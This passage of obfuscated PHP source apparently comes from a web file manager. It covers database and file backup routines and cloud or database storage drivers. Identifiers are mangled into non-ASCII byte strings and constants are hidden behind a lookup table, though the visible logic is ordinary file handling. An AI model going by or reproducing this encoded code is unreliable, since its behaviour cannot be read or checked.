time()); Backup::set($õºöší); if ($à¯è—Ş† - $È‰—ä¦ß > 0) { $ƒ€‹ßËÉ = $¬Ää—‰Æ[872]; if (!stristr(I18n::getType(), $¬Ää—‰Æ[873])) { $ƒ€‹ßËÉ = $¬Ää—‰Æ[874]; } write_log(array($ƒ€‹ßËÉ, $õºöší), $¬Ää—‰Æ[862]); return !1; } return !0; } private function tmpFilesPath() { $Û¯ôá† =& $_SERVER[¶Ô„œ…¯]; $»Æ’àê‰ = TEMP_FILES; if ($GLOBALS[$Û¯ôá†[6]][$Û¯ôá†[92]][$Û¯ôá†[875]]) { $»Æ’àê‰ = $GLOBALS[$Û¯ôá†[6]][$Û¯ôá†[92]][$Û¯ôá†[875]]; if (!mk_dir($»Æ’àê‰) || !is_writable($»Æ’àê‰) || !IO::mkfile($»Æ’àê‰ . $Û¯ôá†[876])) { $»Æ’àê‰ = TEMP_FILES; } } return $»Æ’àê‰; } } class BackupDbFile { public function __construct() { } public function index() { $£ÔÕÊÏÙ =& $_SERVER[¶Ô„œ…¯]; $ş••ìŸ = Backup::get(); $òìöä€ = $ş••ìŸ[$£ÔÕÊÏÙ[32]]; $Ô€«éÃ× = $this->tmpFilesPath() . "\142\x61\x63\153\x75\160\x5f{$òìöä€}\x2f"; $¯Ü³Õû = $this->backupPath($ş••ìŸ); if (!($¯Ü³Õû = IO::mkdir($¯Ü³Õû))) { return !1; } $Ë¤Ôêñ¦ = IO::listPath($Ô€«éÃ×); $İÖ® = isset($Ë¤Ôêñ¦[$£ÔÕÊÏÙ[86]]) ? $Ë¤Ôêñ¦[$£ÔÕÊÏÙ[86]] : array(); $´İ¥Ğ˜ = array_sum(array_column($İÖ®, $£ÔÕÊÏÙ[79])); if (!$´İ¥Ğ˜) { return !1; } $İÉ®—®Ò = array($£ÔÕÊÏÙ[877] => $´İ¥Ğ˜, $£ÔÕÊÏÙ[878] => time()); Backup::set($İÉ®—®Ò); $‚†îŞ¡û = new TaskFileTransfer($£ÔÕÊÏÙ[879], $£ÔÕÊÏÙ[862], count($İÖ®), LNG($£ÔÕÊÏÙ[863]) . $£ÔÕÊÏÙ[464] . LNG($£ÔÕÊÏÙ[865]) . $£ÔÕÊÏÙ[880]); $‚†îŞ¡û->task[$£ÔÕÊÏÙ[841]] = $´İ¥Ğ˜; foreach ($Ë¤Ôêñ¦[$£ÔÕÊÏÙ[86]] as $¦ªÈ—àŠ) { $şºÈÖ§É = IO::move($¦ªÈ—àŠ[$£ÔÕÊÏÙ[87]], $¯Ü³Õû); if (!$şºÈÖ§É) { $‚†îŞ¡û->end(); $—°İ”Ì = IO::getLastError($£ÔÕÊÏÙ[881] . $¦ªÈ—àŠ[$£ÔÕÊÏÙ[87]] . $£ÔÕÊÏÙ[882] . $¯Ü³Õû . $£ÔÕÊÏÙ[178]); write_log($—°İ”Ì, $£ÔÕÊÏÙ[862]); return !1; } } $å€÷‹¼î = new DbManage(); $Ù­€±§« = $å€÷‹¼î->getSqlFile(); if (!$Ù­€±§«[$£ÔÕÊÏÙ[883]] || !$Ù­€±§«[$£ÔÕÊÏÙ[13]]) { return !1; } IO::move($Ù­€±§«[$£ÔÕÊÏÙ[883]], $¯Ü³Õû); IO::move($Ù­€±§«[$£ÔÕÊÏÙ[13]], $¯Ü³Õû); $‚†îŞ¡û->end(); $İÉ®—®Ò = array($£ÔÕÊÏÙ[884] => $´İ¥Ğ˜, $£ÔÕÊÏÙ[885] => time()); Backup::set($İÉ®—®Ò); return !0; } private function backupPath($®¡¢Áş–) { $©¯ùñ¢ =& $_SERVER[¶Ô„œ…¯]; $èàÂ­‡ = $®¡¢Áş–[$©¯ùñ¢[32]]; $ØöØÂğ = Model($©¯ùñ¢[848])->get($©¯ùñ¢[849]); $©š´…Šà = substr(md5($©¯ùñ¢[850] . $ØöØÂğ . $èàÂ­‡), 0, 8); return "\x7b\x69\157\72{$®¡¢Áş–[$©¯ùñ¢[830]]}\175\x2f\144\x61\164\141\142\141\x73\x65\57\142\x61\143\x6b\165\x70\x2f" . $èàÂ­‡ . $©¯ùñ¢[11] . $©š´…Šà; } private function tmpFilesPath() { $ËœÚÛ‚È =& $_SERVER[¶Ô„œ…¯]; $œªË¿ = TEMP_FILES; if ($GLOBALS[$ËœÚÛ‚È[6]][$ËœÚÛ‚È[92]][$ËœÚÛ‚È[875]]) { $œªË¿ = $GLOBALS[$ËœÚÛ‚È[6]][$ËœÚÛ‚È[92]][$ËœÚÛ‚È[875]]; if (!mk_dir($œªË¿) || !is_writable($œªË¿) || !IO::mkfile($œªË¿ . $ËœÚÛ‚È[876])) { $œªË¿ = TEMP_FILES; } } return $œªË¿; } } class BackupFile { public function __construct() { } public function index() { $¹àÆº‚ = Backup::get(); $¢Ç¿¡ç = $¹àÆº‚[$_SERVER[¶Ô„œ…¯][370]][$_SERVER[¶Ô„œ…¯][232]][$_SERVER[¶Ô„œ…¯][543]]; $Ñ•¶Êµí = array($_SERVER[¶Ô„œ…¯][544] => array($_SERVER[¶Ô„œ…¯][886], $¢Ç¿¡ç), $_SERVER[¶Ô„œ…¯][887] => array($_SERVER[¶Ô„œ…¯][408], $¹àÆº‚[$_SERVER[¶Ô„œ…¯][830]])); $äı™Ô”´ = (int) Model($_SERVER[¶Ô„œ…¯][868])->where($Ñ•¶Êµí)->count($_SERVER[¶Ô„œ…¯][543]); $ÙÉµ­Â = (int) Model($_SERVER[¶Ô„œ…¯][868])->where($Ñ•¶Êµí)->sum($_SERVER[¶Ô„œ…¯][79]); $—÷·ü­µ = new TaskFileTransfer($_SERVER[¶Ô„œ…¯][888], $_SERVER[¶Ô„œ…¯][862], $äı™Ô”´, LNG($_SERVER[¶Ô„œ…¯][863]) . $_SERVER[¶Ô„œ…¯][864] . LNG($_SERVER[¶Ô„œ…¯][889])); $—÷·ü­µ->task[$_SERVER[¶Ô„œ…¯][841]] = $ÙÉµ­Â; $Î”¶·ö€ = array($_SERVER[¶Ô„œ…¯][890] => $äı™Ô”´, $_SERVER[¶Ô„œ…¯][891] => $ÙÉµ­Â, $_SERVER[¶Ô„œ…¯][892] => time()); Backup::set($Î”¶·ö€); $á‹Â—è¶ = !0; $úöı·Ù­ = $this->storeIds(); $–óÖ€ìÒ = 1; $°€ı—Å = 1000; $à¢òÇËæ = $È“¿ò„Œ = 0; $€ò’éÚÈ = array(); $Ÿ‘ÁóÖ = $ÂıÀë»Œ = 0; do { $ª²µş£ = $_SERVER[¶Ô„œ…¯][893]; $œ—¢…µ¤ = Model($_SERVER[¶Ô„œ…¯][868])->where($Ñ•¶Êµí)->field($ª²µş£)->order($_SERVER[¶Ô„œ…¯][894])->selectPage($°€ı—Å, $–óÖ€ìÒ); $ÏÒğî˜ = !empty($œ—¢…µ¤[$_SERVER[¶Ô„œ…¯][447]]) ? $œ—¢…µ¤[$_SERVER[¶Ô„œ…¯][447]] : array(); foreach ($ÏÒğî˜ as $‡óšÆšÛ) { if (!$this->_fileExist($‡óšÆšÛ, $€ò’éÚÈ, $úöı·Ù­)) { write_log("\x66\x69\154\145\x20\x6e\x6f\164\x20\x65\x78\151\x73\164\x2e\146\151\154\x65\x49\x44\72{$‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][543]]}\x2c\x20\x70\141\164\150\72{$‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][87]]}", $_SERVER[¶Ô„œ…¯][895]); continue; } $ø‡ŒÜíó = $‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][87]]; $û¬‘ÔÓ› = "\x7b\x69\157\72{$¹àÆº‚[$_SERVER[¶Ô„œ…¯][830]]}\x7d" . substr($ø‡ŒÜíó, strlen("\173\x69\157\x3a{$‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][896]]}\x7d")); if (IO::exist($û¬‘ÔÓ›)) { $—÷·ü­µ->updateFileEnd($‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][32]], $‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][79]]); } else { $û¬‘ÔÓ› = get_path_father($û¬‘ÔÓ›); IO::mkdir($û¬‘ÔÓ›); if (!IO::copy($ø‡ŒÜíó, $û¬‘ÔÓ›, $_SERVER[¶Ô„œ…¯][897])) { write_log($_SERVER[¶Ô„œ…¯][898] . $ø‡ŒÜíó . $_SERVER[¶Ô„œ…¯][882] . $û¬‘ÔÓ› . $_SERVER[¶Ô„œ…¯][178], $_SERVER[¶Ô„œ…¯][862]); $á‹Â—è¶ = !1; break; } } $¢Ç¿¡ç = $‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][543]]; $È“¿ò„Œ += 1; $à¢òÇËæ += $‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][79]]; $ÂıÀë»Œ += 1; $Ÿ‘ÁóÖ += $‡óšÆšÛ[$_SERVER[¶Ô„œ…¯][79]]; if ($à¢òÇËæ >= 1024 * 1024 * 100) { $Î”¶·ö€ = array($_SERVER[¶Ô„œ…¯][829] => $¢Ç¿¡ç, $_SERVER[¶Ô„œ…¯][899] => $ÂıÀë»Œ, $_SERVER[¶Ô„œ…¯][900] => $Ÿ‘ÁóÖ); Backup::set($Î”¶·ö€); $à¢òÇËæ = $È“¿ò„Œ = 0; } } $ç³ ¬çõ = count($ÏÒğî˜); $–óÖ€ìÒ++; } while ($ç³ ¬çõ == $°€ı—Å); $—÷·ü­µ->end(); $Î”¶·ö€ = array($_SERVER[¶Ô„œ…¯][901] => 1, $_SERVER[¶Ô„œ…¯][839] => time(), $_SERVER[¶Ô„œ…¯][853] => 1, $_SERVER[¶Ô„œ…¯][829] => $¢Ç¿¡ç, $_SERVER[¶Ô„œ…¯][902] => time()); if ($È“¿ò„Œ) { $Î”¶·ö€[$_SERVER[¶Ô„œ…¯][899]] = $ÂıÀë»Œ; $Î”¶·ö€[$_SERVER[¶Ô„œ…¯][900]] = $Ÿ‘ÁóÖ; } Backup::set($Î”¶·ö€); return !0; } private function _fileExist($ªåÜ¯®, &$ÌæüÏä, $íÀÙ¢†Â) { $ğº«Êã÷ =& $_SERVER[¶Ô„œ…¯]; $¾Ş³Æ = $ªåÜ¯®[$ğº«Êã÷[87]]; if (in_array($ªåÜ¯®[$ğº«Êã÷[543]], $ÌæüÏä)) { return !1; } if (!in_array($ªåÜ¯®[$ğº«Êã÷[896]], $íÀÙ¢†Â)) { return !1; } if (IO::exist($¾Ş³Æ)) { return !0; } $‰ŒïŠí = get_path_father($¾Ş³Æ); if (IO::exist($‰ŒïŠí)) { $ÌæüÏä[] = $ªåÜ¯®[$ğº«Êã÷[543]]; return !1; } $œîÃİï = array($ğº«Êã÷[896] => $ªåÜ¯®[$ğº«Êã÷[896]], $ğº«Êã÷[87] => array($ğº«Êã÷[461], "{$‰ŒïŠí}\45")); $•ÜğîÔê = Model($ğº«Êã÷[868])->where($œîÃİï)->field($ğº«Êã÷[544])->select(); $ÌæüÏä = array_merge($ÌæüÏä, array_to_keyvalue($•ÜğîÔê, $ğº«Êã÷[12], $ğº«Êã÷[543])); return !1; } private function _fileFilter($È©Òûù†) { $µşüØÛ½ =& $_SERVER[¶Ô„œ…¯]; return; if (empty($È©Òûù†)) { return; } $ë·ıâÁı = array($µşüØÛ½[543] => array($µşüØÛ½[7], array_unique($È©Òûù†))); $¡Ù¯Õ®… = Model($µşüØÛ½[903])->where($ë·ıâÁı)->field($µşüØÛ½[193])->select(); foreach ($¡Ù¯Õ®… as $Ÿù‘«Ş«) { Model($µşüØÛ½[903])->remove($Ÿù‘«Ş«[$µşüØÛ½[193]], !1); } } private function storeIds() { $š ü·½Å =& $_SERVER[¶Ô„œ…¯]; $»½º¶¯È = Model($š ü·½Å[845])->listData(); $ñØÑ³•² = array(); $«ÅçËÀ = $GLOBALS[$š ü·½Å[6]][$š ü·½Å[92]][$š ü·½Å[904]]; foreach ($»½º¶¯È as $èãíµòà) { $”Õ¸úùË = strtolower($èãíµòà[$š ü·½Å[98]]); if (!isset($«ÅçËÀ[$”Õ¸úùË])) { continue; } $ªÉ÷¿İ = $š ü·½Å[77] . (isset($«ÅçËÀ[$”Õ¸úùË]) ? $«ÅçËÀ[$”Õ¸úùË] : ucfirst($”Õ¸úùË)); if (!class_exists($ªÉ÷¿İ)) { continue; } $ñØÑ³•²[] = $èãíµòà[$š ü·½Å[477]]; } return $ñØÑ³•²; } } goto aáôËÀÍ×; f‰«®Œ™™Õ: class PathDriverBOS extends PathDriverS3 { public function __construct($šÎ¢±×) { parent::__construct($šÎ¢±×); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ÖÔ¬íÄ„) { $ñŠ¨ûî¿ =& $_SERVER[¶Ô„œ…¯]; if (substr($ÖÔ¬íÄ„, 0, 7) == $ñŠ¨ûî¿[218]) { $ÖÔ¬íÄ„ = $ñŠ¨ûî¿[219] . substr($ÖÔ¬íÄ„, 7); } header($ñŠ¨ûî¿[175] . $ÖÔ¬íÄ„); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($†‰‰Ğîâ) { parent::__construct($†‰‰Ğîâ); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } public function uploadFormData($Ç‰õöş·, $—ï˜×áß = 3600) { $¥º™àÌÚ =& $_SERVER[¶Ô„œ…¯]; $®ğë¿¼º = $¥º™àÌÚ[231]; $»‚ÓÙÙà = $¥º™àÌÚ[1419]; $Õ”¾µğ = $¥º™àÌÚ[263]; $ì…ŞÓˆ = gmdate($¥º™àÌÚ[1420], time() + $—ï˜×áß); $ÔÛ £Ø— = (string) time() . $¥º™àÌÚ[74] . (string) (time() + $—ï˜×áß); $ƒµÁ°³¬ = array($¥º™àÌÚ[264] => $ì…ŞÓˆ, $¥º™àÌÚ[267] => array(array($¥º™àÌÚ[308] => $®ğë¿¼º), array($¥º™àÌÚ[268] => $this->bucket), array($¥º™àÌÚ[269], $¥º™àÌÚ[270], $¥º™àÌÚ[12]), array($¥º™àÌÚ[272] => $Õ”¾µğ), array($¥º™àÌÚ[1421] => $»‚ÓÙÙà), array($¥º™àÌÚ[1422] => $this->accessKey), array($¥º™àÌÚ[1423] => $ÔÛ £Ø—))); $ƒµÁ°³¬ = json_encode($ƒµÁ°³¬); $ÖéÊîÄÂ = hash_hmac($¥º™àÌÚ[1419], $ÔÛ £Ø—, $this->secret); $üŠ¢‡üá = sha1($ƒµÁ°³¬); $íøğƒœÁ = hash_hmac($¥º™àÌÚ[1419], $üŠ¢‡üá, $ÖéÊîÄÂ); $ñª ğšÙ = array($¥º™àÌÚ[308] => $®ğë¿¼º, $¥º™àÌÚ[272] => $Õ”¾µğ, $¥º™àÌÚ[279] => base64_encode($ƒµÁ°³¬), $¥º™àÌÚ[1421] => $»‚ÓÙÙà, $¥º™àÌÚ[1422] => $this->accessKey, $¥º™àÌÚ[1424] => $ÔÛ £Ø—, $¥º™àÌÚ[1425] => $íøğƒœÁ, $¥º™àÌÚ[208] => $this->getHost()); return $ñª ğšÙ; } public function fileOutImage($¾™“˜§, $ªÍœ’ˆ  = 250) { $ì´ğ†é¸ =& $_SERVER[¶Ô„œ…¯]; if ($this->size($¾™“˜§) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¾™“˜§, $ªÍœ’ˆ ); } $–ËÅÔ€© = $this->link($¾™“˜§); $–ËÅÔ€© .= $ì´ğ†é¸[1426] . $ªÍœ’ˆ  . $ì´ğ†é¸[1427]; $this->fileOutLink($–ËÅÔ€©); } public function fileOutLink($¸œØ×Æ¦) { $ƒì††öè =& $_SERVER[¶Ô„œ…¯]; if (substr($¸œØ×Æ¦, 0, 7) == $ƒì††öè[218]) { $¸œØ×Æ¦ = $ƒì††öè[219] . substr($¸œØ×Æ¦, 7); } header($ƒì††öè[175] . $¸œØ×Æ¦); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¥Ô§ÈÙ°) { $this->pathParse = $¥Ô§ÈÙ°; $this->model = Model($_SERVER[¶Ô„œ…¯][1428]); } public function getPath($·ëüÈéÉ) { return trim($·ëüÈéÉ, $_SERVER[¶Ô„œ…¯][8]); } public function pathFather($«ôœ¥º¨) { $¼³¬Ğ¡É = $this->parse($«ôœ¥º¨); $¼³¬Ğ¡É = $this->infoSimple($«ôœ¥º¨); return $¼³¬Ğ¡É ? $¼³¬Ğ¡É[$_SERVER[¶Ô„œ…¯][192]] : !1; } public function pathThis($ë‘âã¬ç) { $óŸ¶“‡Š = $this->infoSimple($ë‘âã¬ç); return $óŸ¶“‡Š ? $óŸ¶“‡Š[$_SERVER[¶Ô„œ…¯][32]] : !1; } public function getPathOuter($çÓµ¼Âı) { if (!$çÓµ¼Âı) { return $çÓµ¼Âı; } $ÙªÔ¶õ = $this->parse($çÓµ¼Âı); return KodIO::make($ÙªÔ¶õ[$_SERVER[¶Ô„œ…¯][477]]); } public function copyFolderFromIO($é´ü¯Ï§, $ø²®àíá, $é¿Ò‰ûå, $Í°ÉÍ“Ò, $˜•óı£) { $ñ¢º²Ú = $this->model->copyFolderFromIO($é´ü¯Ï§, $ø²®àíá, $é¿Ò‰ûå, $Í°ÉÍ“Ò, $˜•óı£); return KodIO::make($ñ¢º²Ú); } public function isParentOf($åòñ©Ê, $®ÕİÔÃå) { return $this->model->isParentOf($åòñ©Ê, $®ÕİÔÃå); } public function mkfile($–¥´æ°–, $ˆéÌÕ„Ø = '', $ü·ãß«İ = REPEAT_RENAME) { $Å™¹œ†ê =& $_SERVER[¶Ô„œ…¯]; $€§°æ‡å = $this->parse($–¥´æ°–); $–¥´æ°– = $€§°æ‡å[$Å™¹œ†ê[477]]; for ($íæÏ÷”˜ = 0; $íæÏ÷”˜ < count($€§°æ‡å[$Å™¹œ†ê[1429]]); $íæÏ÷”˜++) { $ªØØíûµ = $€§°æ‡å[$Å™¹œ†ê[1429]][$íæÏ÷”˜]; if ($íæÏ÷”˜ == count($€§°æ‡å[$Å™¹œ†ê[1429]]) - 1) { $–¥´æ°– = $this->model->mkfile($–¥´æ°–, $ªØØíûµ, $ˆéÌÕ„Ø, $ü·ãß«İ); break; } $–¥´æ°– = $this->model->mkdir($–¥´æ°–, $ªØØíûµ, REPEAT_SKIP); } return $this->getPathOuter($–¥´æ°–); } public function mkdir($°ïÇ¨ù, $¶°¡î¬ß = REPEAT_SKIP) { $ôİÖâ =& $_SERVER[¶Ô„œ…¯]; $ƒŞÃö× = $this->parse($°ïÇ¨ù); $°ïÇ¨ù = $ƒŞÃö×[$ôİÖâ[477]]; for ($ÜÓº¹Õˆ = 0; $ÜÓº¹Õˆ < count($ƒŞÃö×[$ôİÖâ[1429]]); $ÜÓº¹Õˆ++) { $‹Ï’«×¸ = $ƒŞÃö×[$ôİÖâ[1429]][$ÜÓº¹Õˆ]; $°ïÇ¨ù = $this->model->mkdir($°ïÇ¨ù, $‹Ï’«×¸, $¶°¡î¬ß); } return $this->getPathOuter($°ïÇ¨ù); } public function copyFile($×í•óŞë, $Ø„³Û¯º, $’Øù¼µº = REPEAT_REPLACE) { $é®ç›±¤ =& $_SERVER[¶Ô„œ…¯]; $†„Ÿ²–Ù = $this->parse($Ø„³Û¯º); $ôş©Îä² = $this->model->copy($×í•óŞë, $†„Ÿ²–Ù[$é®ç›±¤[477]], $’Øù¼µº, $†„Ÿ²–Ù[$é®ç›±¤[87]]); return $ôş©Îä² ? $this->getPathOuter($ôş©Îä²) : !1; } public function moveFile($’ñöâû, $óö¨¾‡Œ, $­‚öß¥ê = REPEAT_REPLACE) { $§Ú‡Ùä¯ =& $_SERVER[¶Ô„œ…¯]; $˜êÆù¡© = $this->parse($óö¨¾‡Œ); $ ¾¼û™’ = $this->model->move($’ñöâû, $˜êÆù¡©[$§Ú‡Ùä¯[477]], $­‚öß¥ê, $˜êÆù¡©[$§Ú‡Ùä¯[87]]); return $ ¾¼û™’ ? $this->getPathOuter($ ¾¼û™’) : !1; } public function copy($§À×²ù¯, $´Ù¨Ï­Ÿ, $îæ•´¾Ê = REPEAT_REPLACE, $—¡ñª = false) { $ùÙÒÍã¿ = $this->parse($´Ù¨Ï­Ÿ); $¹É±™Ôé = $this->model->copy($§À×²ù¯, $ùÙÒÍã¿[$_SERVER[¶Ô„œ…¯][477]], $îæ•´¾Ê, $—¡ñª); return $¹É±™Ôé ? $this->getPathOuter($¹É±™Ôé) : !1; } public function moveSameAllow() { } public function move($°Óşğ£­, $ñÇ½ŒáÚ, $Şö‹Ò´Ñ = REPEAT_REPLACE, $°ĞÌÍ…¡ = false) { $Á™€í± = $this->parse($ñÇ½ŒáÚ); $›şÛÕ ç = $this->model->move($°Óşğ£­, $Á™€í±[$_SERVER[¶Ô„œ…¯][477]], $Şö‹Ò´Ñ, $°ĞÌÍ…¡); return $›şÛÕ ç ? $this->getPathOuter($›şÛÕ ç) : !1; } public function remove($Åœğ¹Ê, $Ö†Ò£‚¬ = true) { return $this->model->remove($Åœğ¹Ê, $Ö†Ò£‚¬); } public function rename($îµ†’²æ, $‡°éöÑ) { $Ø®¤ÎÂé = $this->model->rename($îµ†’²æ, $‡°éöÑ); return $Ø®¤ÎÂé ? $this->getPathOuter($îµ†’²æ) : $Ø®¤ÎÂé; } public function size($ Ì¿ı«Í) { $ıÓâ•£ = $this->infoSimple($ Ì¿ı«Í); return $ıÓâ•£ ? $ıÓâ•£[$_SERVER[¶Ô„œ…¯][79]] : 0; } public function infoSimple($²şïÔ®ê) { return $this->model->sourceInfo($²şïÔ®ê); } public function info($çãÀ«´­) { return $this->infoParse($çãÀ«´­); } public function infoAuth($êÀ¦´ø) { return $this->infoParse($êÀ¦´ø, !1, !0); } public function infoWithChildren($Ê‰¯ãëù) { return $this->infoParse($Ê‰¯ãëù, !0); } protected function infoParse($¸èÍ¡÷, $ÍßäïÀá = false, $æ‡Æ±› = false) { if (!$ÍßäïÀá) { return $this->model->pathInfo($¸èÍ¡÷, $æ‡Æ±›); } return $this->model->pathInfoMore($¸èÍ¡÷); } public function infoFullSimple($—ÀŸ†È) { $ØÃ½®Ì´ =& $_SERVER[¶Ô„œ…¯]; $øÊú·óá = explode($ØÃ½®Ì´[8], $—ÀŸ†È); $ŞœÎ¿Š™ = implode($ØÃ½®Ì´[8], array_splice($øÊú·óá, 1)); return $this->model->pathInfoByPath($øÊú·óá[0], $ŞœÎ¿Š™); } public function infoFull($Æö¤ó¢à) { $Ô¨ï²¦é = $this->infoFullSimple($Æö¤ó¢à); return is_array($Ô¨ï²¦é) ? $this->model->pathInfo($Ô¨ï²¦é[$_SERVER[¶Ô„œ…¯][193]]) : !1; } public function hashSimple($…¤ ¬ù½) { $­¹Ù²”® =& $_SERVER[¶Ô„œ…¯]; $—Áü¤Å‘ = $this->infoWithChildren($…¤ ¬ù½); return $—Áü¤Å‘[$­¹Ù²”®[170]][$­¹Ù²”®[677]]; } public function hashMd5($Äú¿œÊ÷) { $¥ˆ¯ë—€ =& $_SERVER[¶Ô„œ…¯]; $¦øƒŠí± = $this->infoWithChildren($Äú¿œÊ÷); return $¦øƒŠí±[$¥ˆ¯ë—€[170]][$¥ˆ¯ë—€[549]]; } public function exist($­Íö¿‘ç) { $‡™„¡¡® =& $_SERVER[¶Ô„œ…¯]; $¡‹«ğë§ = $this->parse($­Íö¿‘ç); if (!$¡‹«ğë§[$‡™„¡¡®[87]]) { return $this->isFile($­Íö¿‘ç) || $this->isFolder($­Íö¿‘ç); } $ï»ÃÜö = array($‡™„¡¡®[479] => $¡‹«ğë§[$‡™„¡¡®[477]], $‡™„¡¡®[32] => $¡‹«ğë§[$‡™„¡¡®[87]]); $šßÒæ¤ = $this->model->where($ï»ÃÜö)->find(); return $šßÒæ¤ ? !0 : !1; } public function isFile($€‰æ¿œ) { $Ïª‰·¦Œ =& $_SERVER[¶Ô„œ…¯]; $ÎÊ¨ú¢Ï = $this->infoSimple($€‰æ¿œ); return $ÎÊ¨ú¢Ï && $ÎÊ¨ú¢Ï[$Ïª‰·¦Œ[487]] == $Ïª‰·¦Œ[230] ? !0 : !1; } public function isFolder($ö‹²§”ã) { $è Ó¨ª¦ =& $_SERVER[¶Ô„œ…¯]; $²ğŒ–Û = $this->infoSimple($ö‹²§”ã); return $²ğŒ–Û && $²ğŒ–Û[$è Ó¨ª¦[487]] == $è Ó¨ª¦[91] ? !0 : !1; } public function listPath($ê§Î ¶, $ÇÃñı•â = false) { $øŒœ•ëí =& $_SERVER[¶Ô„œ…¯]; if ($ê§Î ¶ == $øŒœ•ëí[12]) { return !1; } $¯ºãõ‹’ = array($øŒœ•ëí[479] => $ê§Î ¶); if ($ÇÃñı•â) { return $this->model->listSource($¯ºãõ‹’, -1); } return $this->model->listSource($¯ºãõ‹’); } public function has($‘Ÿƒ¾·», $µĞÁ¸€– = false, $§Š™ÏìŠ = null) { $»¥ ¦ÊÏ =& $_SERVER[¶Ô„œ…¯]; $éÍûõö = $this->infoWithChildren($‘Ÿƒ¾·»); if ($µĞÁ¸€–) { return array($»¥ ¦ÊÏ[242] => $éÍûõö[$»¥ ¦ÊÏ[242]], $»¥ ¦ÊÏ[241] => $éÍûõö[$»¥ ¦ÊÏ[241]]); } return $§Š™ÏìŠ ? $éÍûõö[$»¥ ¦ÊÏ[242]] : $éÍûõö[$»¥ ¦ÊÏ[241]]; } public function listAll($ıØ¦Ñæ¼) { $Ëï°€˜¯ = IO::info($this->pathParse[$_SERVER[¶Ô„œ…¯][87]]); if (!$Ëï°€˜¯) { return array(); } return $this->model->listAll($ıØ¦Ñæ¼); } public function getContent($Ú§ŸËúì) { return $this->model->getContent($Ú§ŸËúì); } public function setContent($‹ê¤æ¦â, $ş¨™Î£ = '') { return $this->model->setContent($‹ê¤æ¦â, $ş¨™Î£); } public function fileSubstr($Â¢’®œ, $Æ£ğ‰ã, $¢¡¨»®®) { return $this->model->fileSubstr($Â¢’®œ, $Æ£ğ‰ã, $¢¡¨»®®); } public function download($œ¿ÈİÃÙ, $¼ µ¦ó€ = '') { $¶˜ú™Şù = get_path_father($¼ µ¦ó€); $ÇÅùº ¤ = get_path_this($¼ µ¦ó€); $ıÜüÊØÕ = $this->model->fileInfoGet($œ¿ÈİÃÙ); $º¥·Şº = IO::copy($ıÜüÊØÕ[$_SERVER[¶Ô„œ…¯][87]], $¶˜ú™Şù, !1, $ÇÅùº ¤); return $º¥·Şº; } public function setModifyTime($ŞàÕ¢±¤, $„˜í­ş» = '') { $×™§í¦Ã =& $_SERVER[¶Ô„œ…¯]; if (!$ŞàÕ¢±¤) { return; } $this->model->where(array($×™§í¦Ã[493] => $ŞàÕ¢±¤))->save(array($×™§í¦Ã[88] => $„˜í­ş»)); } public function upload($ã¬×–ÎÂ, $Ê¡³ôŸè, $ïƒİÔ™Û = false, $“Œ©ÁÕî = REPEAT_REPLACE) { $·ÂÊäµæ =& $_SERVER[¶Ô„œ…¯]; $ø´Èñ»¸ = $this->parse($ã¬×–ÎÂ); $ÉÌ„‚Şœ = $this->model->addFile($ø´Èñ»¸[$·ÂÊäµæ[477]], $Ê¡³ôŸè, $ø´Èñ»¸[$·ÂÊäµæ[87]], $ïƒİÔ™Û, $“Œ©ÁÕî); return $this->getPathOuter($ÉÌ„‚Şœ); } public function uploadFileByID($©¶§¥µí, $°ûëÛÚÄ, $¥ìÈÂù…) { $»×”ñº =& $_SERVER[¶Ô„œ…¯]; $±¥¯‡ŞÃ = $this->parse($©¶§¥µí); $“Áª¢óş = $this->model->addFileByFileID($±¥¯‡ŞÃ[$»×”ñº[477]], $°ûëÛÚÄ, $±¥¯‡ŞÃ[$»×”ñº[87]], $¥ìÈÂù…); return $this->getPathOuter($“Áª¢óş); } public function addFileByRemote($÷ØŒÃ¤š, $ÄæîÂÌ, $í¥ªÖÂ€ = array(), $ı—›»­½ = '', $öÃ°ôõÃ) { $Û™ÉåƒÔ =& $_SERVER[¶Ô„œ…¯]; $øùèÔ”À = $this->parse($÷ØŒÃ¤š); $ı—›»­½ = empty($ı—›»­½) ? $øùèÔ”À[$Û™ÉåƒÔ[87]] : $ı—›»­½; $·Öï³Ÿˆ = $this->model->addFileByRemote($øùèÔ”À[$Û™ÉåƒÔ[477]], $ÄæîÂÌ, $ı—›»­½, $í¥ªÖÂ€, $öÃ°ôõÃ); return $this->getPathOuter($·Öï³Ÿˆ); } public function uploadLink($€µŸ‰ÏÄ, $ë“áŒ“è = 0) { $Øšß®ºŸ =& $_SERVER[¶Ô„œ…¯]; $øÜâ´Ë = $this->parse($€µŸ‰ÏÄ); $è³œùİÄ = _get($GLOBALS[$Øšß®ºŸ[7]], $Øšß®ºŸ[1430]); $ß®Ïßıò = _get($GLOBALS[$Øšß®ºŸ[7]], $Øšß®ºŸ[1431]); $€µŸ‰ÏÄ = Model($Øšß®ºŸ[679])->createFileName($øÜâ´Ë[$Øšß®ºŸ[87]], $è³œùİÄ, $ß®Ïßıò); return IO::uploadLink($€µŸ‰ÏÄ, $ë“áŒ“è); } public function fileNameAuto($·¡ñÙåù, $ıµ·şÛ, $’¹°ü›ì = REPEAT_REPLACE, $¬„Í£× = false) { return $this->model->fileNameAuto($·¡ñÙåù, $ıµ·şÛ, $’¹°ü›ì, $¬„Í£×); } public function fileNameExist($¼’ÅŞ„, $ĞÉ îÙ©) { return $this->model->fileNameExist($¼’ÅŞ„, $ĞÉ îÙ©); } protected function _fileOut($¬°·§Û, $ø¿ò†‹‚ = false, $Ñ’ã»„­ = false, $„ÃóÄÀã = '', $­Ÿƒş÷ = false) { $™ÆØµ» =& $_SERVER[¶Ô„œ…¯]; $ïóë™¤é = $this->model->sourceInfo($¬°·§Û); if ($ïóë™¤é[$™ÆØµ»[487]] == $™ÆØµ»[91]) { header($™ÆØµ»[1432]); die; } $ì¨Šø™ü = $this->model->fileInfoGet($¬°·§Û); $„ÃóÄÀã = 